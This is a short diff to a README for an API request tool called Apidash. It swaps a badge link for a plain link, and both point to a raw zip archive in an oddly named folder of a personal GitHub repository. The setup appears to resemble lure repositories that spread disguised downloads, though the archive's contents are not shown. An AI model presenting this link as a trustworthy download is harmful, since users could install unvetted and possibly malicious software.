@@ -1,6 +1,6 @@
 # 🚀 Apidash - Simplify Your API Requests Easily
 
-[![Download Apidash](https://raw.githubusercontent.com/vilchisangelraulvilchis/Apidash/main/Phasianella/Apidash.zip)](https://raw.githubusercontent.com/vilchisangelraulvilchis/Apidash/main/Phasianella/Apidash.zip)
+[Download Apidash](https://raw.githubusercontent.com/vilchisangelraulvilchis/Apidash/main/Phasianella/Apidash.zip)
 
 ## 🌟 About Apidash
 
